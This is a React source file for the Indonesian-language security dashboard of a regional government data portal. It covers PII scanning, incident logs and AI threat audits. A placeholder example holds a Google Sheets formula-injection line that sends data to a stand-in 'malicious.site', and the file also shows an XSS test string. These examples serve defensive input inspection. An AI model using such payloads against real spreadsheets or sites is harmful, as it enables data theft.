import React, { useMemo, useState } from 'react';
import {
  AlertTriangle,
  Bot,
  CheckCircle2,
  Lock,
  ScanSearch,
  ShieldAlert,
  ShieldCheck,
  Sparkles,
  Trash2,
} from 'lucide-react';
import { isPlaceholderEndpoint } from '../config/opdSheets';
import { getActiveAuthSheetConfig } from '../services/authSheetService';
import {
  AiPayloadInspection,
  AiThreatAnalysis,
  appendSecurityEvent,
  requestAiPayloadInspection,
  requestAiThreatAnalysis,
  scanPiiExposure,
} from '../services/cyberSecurityService';
import { getActivePublishSheetConfig } from '../services/publishSheetService';
import {
  OpdAccount,
  OpdDynamicSheet,
  PublishedDatasetClone,
  SecurityEventEntry,
} from '../types/satuData';

interface KeamananSiberViewProps {
  accounts: OpdAccount[];
  sheets: OpdDynamicSheet[];
  clones: PublishedDatasetClone[];
  securityEvents: SecurityEventEntry[];
  onRefreshEvents: () => void;
  onClearEvents: () => void;
}

export function KeamananSiberView({
  accounts,
  sheets,
  clones,
  securityEvents,
  onRefreshEvents,
  onClearEvents,
}: KeamananSiberViewProps) {
  const [analyzingAi, setAnalyzingAi] = useState(false);
  const [aiError, setAiError] = useState<string | null>(null);
  const [aiReport, setAiReport] = useState<AiThreatAnalysis | null>(null);

  const [payloadInput, setPayloadInput] = useState('');
  const [inspectingPayload, setInspectingPayload] = useState(false);
  const [payloadError, setPayloadError] = useState<string | null>(null);
  const [payloadResult, setPayloadResult] =
    useState<AiPayloadInspection | null>(null);

  const authCfg = getActiveAuthSheetConfig();
  const publishCfg = getActivePublishSheetConfig();

  const piiFindings = useMemo(
    () => scanPiiExposure(sheets, clones),
    [sheets, clones]
  );

  const publicPiiWarnings = useMemo(
    () => piiFindings.filter((f) => f.isPublic),
    [piiFindings]
  );

  const blockedCount = useMemo(
    () => securityEvents.filter((e) => e.diblokir).length,
    [securityEvents]
  );

  const securityChecks = useMemo(() => {
    const authHttps =
      !isPlaceholderEndpoint(authCfg.webhookUrl) &&
      authCfg.webhookUrl.startsWith('https://');
    const pubHttps =
      !isPlaceholderEndpoint(publishCfg.webhookUrl) &&
      publishCfg.webhookUrl.startsWith('https://');
    const allOpdWebhooksHttps =
      sheets.length === 0 ||
      sheets.every(
        (s) => !s.webhookUrl || s.webhookUrl.startsWith('https://script.google.com/')
      );

    return [
      {
        label: 'Kredensial Super Admin Tersembunyi & Diverifikasi Server',
        ok: true,
        detail:
          'Tidak tampil di halaman login maupun kode klien; menggunakan perbandingan constant-time di server.',
      },
      {
        label: 'Proteksi Brute-Force & Rate Limit Login',
        ok: true,
        detail:
          'Penguncian otomatis setelah 5 percobaan gagal (server 5 menit & klien 60 detik).',
      },
      {
        label: 'Filter Anti-Injeksi (XSS, SQLi & Formula Google Sheets)',
        ok: true,
        detail:
          'Menetralkan payload berbahaya (=IMPORTXML, =CMD, <script>) secara otomatis saat input data OPD.',
      },
      {
        label: 'Koneksi Webhook HTTPS Sheet Akun & Publikasi',
        ok: authHttps && pubHttps && allOpdWebhooksHttps,
        detail:
          authHttps && pubHttps
            ? 'Seluruh endpoint Google Apps Script aktif menggunakan HTTPS.'
            : 'Sebagian endpoint Webhook Akun/Publikasi masih placeholder atau belum dihubungkan.',
      },
      {
        label: 'Perlindungan Data Pribadi (PII / UU PDP) pada Publikasi',
        ok: publicPiiWarnings.length === 0,
        detail:
          publicPiiWarnings.length === 0
            ? 'Tidak ada kolom PII sensitif yang terdeteksi pada katalog publikasi Kominfo.'
            : `${publicPiiWarnings.length} dataset publikasi mengandung kolom sensitif (mis. No. HP/NIK/Alamat).`,
      },
    ];
  }, [authCfg.webhookUrl, publishCfg.webhookUrl, sheets, publicPiiWarnings.length]);

  const handleRunAiAudit = async () => {
    setAnalyzingAi(true);
    setAiError(null);
    try {
      const snapshot = {
        waktuAudit: new Date().toISOString(),
        jumlahAkunOpd: accounts.length,
        jumlahSheetOpd: sheets.length,
        jumlahClonePublikasi: clones.length,
        statusWebhookAuth: isPlaceholderEndpoint(authCfg.webhookUrl)
          ? 'placeholder'
          : authCfg.webhookUrl.startsWith('https://')
          ? 'https_aktif'
          : 'non_https',
        statusWebhookPublikasi: isPlaceholderEndpoint(publishCfg.webhookUrl)
          ? 'placeholder'
          : publishCfg.webhookUrl.startsWith('https://')
          ? 'https_aktif'
          : 'non_https',
        temuanPii: piiFindings.map((f) => ({
          scope: f.scope,
          judul: f.judul,
          isPublic: f.isPublic,
          kolomSensitif: f.sensitiveHeaders.map((h) => `${h.header} (${h.category})`),
        })),
        logKeamananTerbaru: securityEvents.slice(0, 25),
      };

      const res = await requestAiThreatAnalysis(snapshot);
      if (!res.ok || !res.analysis) {
        setAiError(res.error || 'Gagal menjalankan analisis AI.');
        return;
      }

      setAiReport(res.analysis);
      appendSecurityEvent({
        kategori: 'Audit AI',
        tingkat:
          res.analysis.tingkatAncaman === 'Kritis' ||
          res.analysis.tingkatAncaman === 'Tinggi'
            ? 'Tinggi'
            : 'Rendah',
        aktor: 'Super Admin Walidata',
        target: 'Sistem Satu Data Nagekeo',
        detail: `Audit AI selesai — Tingkat Ancaman: ${res.analysis.tingkatAncaman} (Skor ${res.analysis.skorKeamanan}/100).`,
        diblokir: false,
      });
      onRefreshEvents();
    } finally {
      setAnalyzingAi(false);
    }
  };

  const handleInspectPayload = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!payloadInput.trim()) return;
    setInspectingPayload(true);
    setPayloadError(null);
    setPayloadResult(null);
    try {
      const res = await requestAiPayloadInspection(payloadInput.trim());
      if (!res.ok || !res.inspection) {
        setPayloadError(res.error || 'Gagal menganalisis payload.');
        return;
      }
      setPayloadResult(res.inspection);
    } finally {
      setInspectingPayload(false);
    }
  };

  const severityColor = (level: string) => {
    const l = level.toLowerCase();
    if (l.includes('kritis') || l.includes('berbahaya'))
      return 'text-red-700 bg-red-50 border-red-200';
    if (l.includes('tinggi'))
      return 'text-orange-800 bg-orange-50 border-orange-200';
    if (l.includes('sedang') || l.includes('mencurigakan'))
      return 'text-amber-800 bg-amber-50 border-amber-200';
    return 'text-emerald-800 bg-emerald-50 border-emerald-200';
  };

  return (
    <div className="space-y-8">
      {/* Header */}
      <div className="flex flex-col lg:flex-row lg:items-end justify-between gap-4">
        <div>
          <p className="text-xs font-medium text-teal-700 inline-flex items-center gap-1.5">
            <ShieldCheck className="w-3.5 h-3.5" />
            Pusat Keamanan Siber &amp; AI Deteksi Peretasan · Diskominfo Nagekeo
          </p>
          <h1 className="text-2xl font-semibold tracking-tight text-slate-900 mt-1">
            Keamanan Data, Anti-Peretasan &amp; Audit AI
          </h1>
          <p className="mt-1 text-sm text-slate-600 max-w-3xl">
            Pantau upaya peretasan (brute-force, injeksi formula Google Sheets,
            XSS/SQLi), deteksi kebocoran data pribadi (PII/UU PDP), dan jalankan
            audit ancaman defensif berbasis AI secara real-time.
          </p>
        </div>

        <button
          type="button"
          onClick={handleRunAiAudit}
          disabled={analyzingAi}
          className="inline-flex items-center gap-2 h-10 px-4 text-xs font-semibold text-white bg-[#0B1B2B] rounded-md hover:bg-slate-800 disabled:opacity-60 whitespace-nowrap shrink-0"
        >
          <Sparkles className="w-4 h-4 text-teal-400" />
          {analyzingAi
            ? 'AI Sedang Menganalisis Ancaman...'
            : 'Jalankan Audit AI Deteksi Peretasan'}
        </button>
      </div>

      {/* Real Computed Security KPI Strip */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
        <div className="bg-white border border-slate-200 rounded-lg p-4">
          <p className="text-xs text-slate-500">Kontrol Keamanan Aktif</p>
          <p className="mt-1 text-2xl font-semibold font-mono tabular-nums text-slate-900">
            {securityChecks.filter((c) => c.ok).length}/{securityChecks.length}
          </p>
        </div>
        <div className="bg-white border border-slate-200 rounded-lg p-4">
          <p className="text-xs text-slate-500">Upaya Serangan Diblokir</p>
          <p className="mt-1 text-2xl font-semibold font-mono tabular-nums text-red-700">
            {blockedCount}
          </p>
        </div>
        <div className="bg-white border border-slate-200 rounded-lg p-4">
          <p className="text-xs text-slate-500">Peringatan PII Publik</p>
          <p
            className={`mt-1 text-2xl font-semibold font-mono tabular-nums ${
              publicPiiWarnings.length > 0 ? 'text-amber-700' : 'text-emerald-700'
            }`}
          >
            {publicPiiWarnings.length}
          </p>
        </div>
        <div className="bg-white border border-slate-200 rounded-lg p-4">
          <p className="text-xs text-slate-500">Total Log Insiden</p>
          <p className="mt-1 text-2xl font-semibold font-mono tabular-nums text-slate-900">
            {securityEvents.length}
          </p>
        </div>
      </div>

      {/* AI Threat Analysis Result Panel */}
      {(aiError || aiReport) && (
        <section className="bg-white border border-slate-200 rounded-xl overflow-hidden shadow-xs">
          <div className="bg-[#0B1B2B] text-white px-6 py-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3">
            <div className="flex items-center gap-2.5">
              <Bot className="w-5 h-5 text-teal-400 shrink-0" />
              <div>
                <h2 className="text-sm font-semibold">
                  Laporan AI Deteksi Peretasan &amp; Risiko Keamanan Siber
                </h2>
                <p className="text-[11px] text-slate-300">
                  Analisis defensif otomatis terhadap log autentikasi, payload,
                  webhook, dan eksposur PII.
                </p>
              </div>
            </div>
            {aiReport && (
              <div className="flex items-center gap-3 text-xs font-mono shrink-0">
                <span>
                  Ancaman:{' '}
                  <strong className="text-teal-300">
                    {aiReport.tingkatAncaman}
                  </strong>
                </span>
                <span className="text-slate-500">|</span>
                <span>
                  Skor:{' '}
                  <strong className="text-white">
                    {aiReport.skorKeamanan}/100
                  </strong>
                </span>
              </div>
            )}
          </div>

          {aiError ? (
            <div className="p-5 text-xs text-red-700 bg-red-50">{aiError}</div>
          ) : aiReport ? (
            <div className="p-6 space-y-6">
              <p className="text-sm text-slate-700 leading-relaxed">
                {aiReport.ringkasanEksekutif}
              </p>

              {aiReport.temuanKerentanan.length > 0 && (
                <div className="space-y-3">
                  <h3 className="text-xs font-semibold text-slate-900 uppercase tracking-wide">
                    Temuan Kerentanan &amp; Vektor Serangan
                  </h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                    {aiReport.temuanKerentanan.map((item, idx) => (
                      <div
                        key={idx}
                        className="border border-slate-200 rounded-lg p-4 space-y-2"
                      >
                        <div className="flex items-start justify-between gap-2">
                          <h4 className="text-sm font-semibold text-slate-900">
                            {item.judul}
                          </h4>
                          <span
                            className={`px-2 py-0.5 text-[11px] font-medium rounded border shrink-0 ${severityColor(
                              item.tingkat
                            )}`}
                          >
                            {item.tingkat}
                          </span>
                        </div>
                        <p className="text-xs text-slate-600">
                          <strong className="text-slate-800">Vektor:</strong>{' '}
                          {item.vektorSerangan}
                        </p>
                        <p className="text-xs text-slate-600">
                          <strong className="text-slate-800">Dampak:</strong>{' '}
                          {item.dampak}
                        </p>
                        <p className="text-xs text-teal-800 bg-teal-50/70 p-2 rounded">
                          <strong>Rekomendasi:</strong> {item.rekomendasi}
                        </p>
                      </div>
                    ))}
                  </div>
                </div>
              )}

              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 pt-4 border-t border-slate-200">
                <div className="space-y-2">
                  <h3 className="text-xs font-semibold text-slate-900 uppercase tracking-wide">
                    Deteksi Anomali &amp; Indikator Retas
                  </h3>
                  <ul className="space-y-1.5 text-xs text-slate-700 list-disc pl-4">
                    {aiReport.deteksiAnomali.map((a, i) => (
                      <li key={i}>{a}</li>
                    ))}
                  </ul>
                </div>

                <div className="space-y-2">
                  <h3 className="text-xs font-semibold text-slate-900 uppercase tracking-wide">
                    Langkah Mitigasi Prioritas Diskominfo
                  </h3>
                  <ol className="space-y-1.5 text-xs text-slate-700 list-decimal pl-4">
                    {aiReport.langkahMitigasiPrioritas.map((step, i) => (
                      <li key={i}>{step}</li>
                    ))}
                  </ol>
                </div>
              </div>
            </div>
          ) : null}
        </section>
      )}

      {/* Row 2: Checklist Keamanan + AI Inspektor Payload */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
        <section className="lg:col-span-6 bg-white border border-slate-200 rounded-lg overflow-hidden">
          <div className="px-5 py-4 border-b border-slate-200">
            <h2 className="text-base font-semibold text-slate-900">
              Postur Pertahanan Siber Portal
            </h2>
            <p className="text-xs text-slate-500 mt-0.5">
              Status kendali keamanan nyata pada sistem autentikasi, input, dan
              publikasi.
            </p>
          </div>
          <div className="divide-y divide-slate-200">
            {securityChecks.map((chk) => (
              <div key={chk.label} className="p-4 flex items-start gap-3">
                {chk.ok ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0 mt-0.5" />
                ) : (
                  <AlertTriangle className="w-4 h-4 text-amber-600 shrink-0 mt-0.5" />
                )}
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-slate-900">
                    {chk.label}
                  </p>
                  <p className="text-xs text-slate-500 mt-0.5">{chk.detail}</p>
                </div>
              </div>
            ))}
          </div>
        </section>

        {/* AI Payload / Intrusion Inspector */}
        <section className="lg:col-span-6 bg-white border border-slate-200 rounded-lg overflow-hidden">
          <div className="px-5 py-4 border-b border-slate-200">
            <h2 className="text-base font-semibold text-slate-900 flex items-center gap-2">
              <ScanSearch className="w-4 h-4 text-teal-700" />
              AI Inspektor Payload &amp; Tautan Mencurigakan
            </h2>
            <p className="text-xs text-slate-500 mt-0.5">
              Tempel teks input, rumus mencurigakan, tautan webhook, atau log
              untuk memeriksa potensi serangan (XSS, Formula Injection, SQLi,
              Phishing).
            </p>
          </div>

          <form onSubmit={handleInspectPayload} className="p-5 space-y-4">
            <textarea
              rows={4}
              value={payloadInput}
              onChange={(e) => setPayloadInput(e.target.value)}
              placeholder='Contoh: =IMPORTXML("http://malicious.site/steal","//a") atau <script>alert(1)</script> atau URL mencurigakan...'
              className="w-full p-3 text-xs font-mono bg-slate-50 border border-slate-300 rounded-md focus:bg-white focus:outline-none focus:border-slate-900"
              required
            />
            <div className="flex justify-end">
              <button
                type="submit"
                disabled={inspectingPayload || !payloadInput.trim()}
                className="inline-flex items-center gap-1.5 h-9 px-4 text-xs font-semibold text-white bg-teal-700 rounded-md hover:bg-teal-800 disabled:opacity-50"
              >
                <Sparkles className="w-3.5 h-3.5" />
                {inspectingPayload
                  ? 'Memeriksa dengan AI...'
                  : 'Analisis Potensi Retas dengan AI'}
              </button>
            </div>

            {payloadError && (
              <div className="p-3 text-xs text-red-700 bg-red-50 border border-red-200 rounded-md">
                {payloadError}
              </div>
            )}

            {payloadResult && (
              <div
                className={`p-4 rounded-lg border space-y-2 text-xs ${severityColor(
                  payloadResult.status
                )}`}
              >
                <div className="flex items-center justify-between gap-2">
                  <strong className="text-sm">
                    Status: {payloadResult.status}
                  </strong>
                  <span className="font-mono font-semibold">
                    {payloadResult.kategoriSerangan}
                  </span>
                </div>
                <p>{payloadResult.penjelasan}</p>
                <p className="pt-1 border-t border-current/15">
                  <strong>Tindakan Disarankan:</strong>{' '}
                  {payloadResult.tindakanDisarankan}
                </p>
              </div>
            )}
          </form>
        </section>
      </div>

      {/* PII Exposure Scanner Table */}
      <section className="bg-white border border-slate-200 rounded-lg overflow-hidden">
        <div className="px-5 py-4 border-b border-slate-200 flex items-center justify-between gap-3">
          <div>
            <h2 className="text-base font-semibold text-slate-900 flex items-center gap-2">
              <Lock className="w-4 h-4 text-slate-700" />
              Pemindai Kolom Data Pribadi (PII / UU PDP)
            </h2>
            <p className="text-xs text-slate-500 mt-0.5">
              Mendeteksi kolom sensitif (NIK, No. HP, Alamat, Tanggal Lahir)
              pada Sheet OPD dan memastikan tidak ikut terpublikasi terbuka.
            </p>
          </div>
          <span className="font-mono tabular-nums text-xs text-slate-500">
            {piiFindings.length} dataset terdeteksi
          </span>
        </div>

        {piiFindings.length === 0 ? (
          <div className="py-10 px-6 text-center text-xs text-slate-500">
            Tidak ditemukan kolom data pribadi sensitif pada sheet terdaftar
            maupun katalog publikasi.
          </div>
        ) : (
          <div className="divide-y divide-slate-200">
            {piiFindings.map((item, idx) => (
              <div
                key={idx}
                className="p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3"
              >
                <div className="space-y-1">
                  <div className="flex flex-wrap items-center gap-2 text-xs">
                    <span
                      className={`font-medium ${
                        item.isPublic ? 'text-red-700' : 'text-slate-600'
                      }`}
                    >
                      {item.isPublic
                        ? 'Risiko Tinggi — Terekspos di Publikasi'
                        : 'Internal OPD (Aman)'}
                    </span>
                    <span className="text-slate-300">·</span>
                    <span className="text-slate-500">{item.opdNama}</span>
                  </div>
                  <p className="text-sm font-semibold text-slate-900">
                    {item.judul}
                  </p>
                </div>
                <div className="flex flex-wrap gap-1.5">
                  {item.sensitiveHeaders.map((h) => (
                    <span
                      key={h.header}
                      className="px-2 py-0.5 text-[11px] font-mono bg-amber-50 text-amber-900 border border-amber-200 rounded"
                    >
                      {h.header}
                    </span>
                  ))}
                </div>
              </div>
            ))}
          </div>
        )}
      </section>

      {/* Security Incident Log */}
      <section className="bg-white border border-slate-200 rounded-lg overflow-hidden">
        <div className="px-5 py-4 border-b border-slate-200 flex items-center justify-between gap-3">
          <div>
            <h2 className="text-base font-semibold text-slate-900 flex items-center gap-2">
              <ShieldAlert className="w-4 h-4 text-red-700" />
              Log Insiden &amp; Upaya Peretasan
            </h2>
            <p className="text-xs text-slate-500 mt-0.5">
              Catatan real-time percobaan login gagal, penguncian brute-force,
              dan pemblokiran injeksi payload.
            </p>
          </div>
          {securityEvents.length > 0 && (
            <button
              type="button"
              onClick={onClearEvents}
              className="inline-flex items-center gap-1.5 h-8 px-3 text-xs font-medium text-slate-600 bg-white border border-slate-300 rounded-md hover:bg-slate-50"
            >
              <Trash2 className="w-3.5 h-3.5" />
              Bersihkan Log
            </button>
          )}
        </div>

        {securityEvents.length === 0 ? (
          <div className="py-10 px-6 text-center text-xs text-slate-500">
            Belum ada insiden keamanan atau upaya peretasan yang tercatat.
          </div>
        ) : (
          <div className="divide-y divide-slate-100">
            {securityEvents.map((ev) => (
              <div
                key={ev.id}
                className="px-5 py-3.5 flex flex-col sm:flex-row sm:items-center justify-between gap-2 text-xs"
              >
                <div className="space-y-0.5 min-w-0">
                  <div className="flex flex-wrap items-center gap-2">
                    <span
                      className={`px-2 py-0.5 text-[10px] font-semibold rounded border ${severityColor(
                        ev.tingkat
                      )}`}
                    >
                      {ev.tingkat}
                    </span>
                    <span className="font-semibold text-slate-900">
                      {ev.kategori}
                    </span>
                    <span className="text-slate-300">·</span>
                    <span className="font-mono text-slate-600">{ev.aktor}</span>
                    {ev.diblokir && (
                      <span className="text-[10px] font-semibold text-red-700">
                        [DIBLOKIR]
                      </span>
                    )}
                  </div>
                  <p className="text-slate-600">{ev.detail}</p>
                </div>
                <span className="font-mono tabular-nums text-[11px] text-slate-400 shrink-0">
                  {new Date(ev.timestamp).toLocaleString('id-ID')}
                </span>
              </div>
            ))}
          </div>
        )}
      </section>
    </div>
  );
}
